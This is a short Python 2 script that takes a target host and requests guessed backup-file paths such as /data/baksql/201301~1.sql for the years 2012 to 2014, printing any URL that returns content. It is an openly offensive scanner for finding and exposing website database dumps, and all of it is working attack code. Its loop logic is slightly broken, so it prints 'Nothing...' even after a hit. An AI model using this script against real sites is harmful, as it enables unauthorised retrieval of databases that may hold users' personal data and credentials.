# -*- coding: UTF-8 -*-

import urllib

from urlparse import urljoin



def run(host):

    print "Starting......"

    

    years =["2012","2013","2014"]

    months = ["01","02","03","04","05","06","07","08","09","10","11","12"]

    

    for y in range(len(years)):

        for i in range(len(months)):

            mdhis = months[i]

            year = years[y]

            url = urljoin(host, "/data/baksql/"+year+mdhis+"~1.sql")

            print url

            res = urllib.urlopen( url )

            if res.getcode() == 200 and len(res.read()) > 0:

                print "Success, The Bak Url Is : >>> " + url

                break



    print "Nothing..."



if __name__ == "__main__":

    import sys

    host = sys.argv[1]

    run(host)
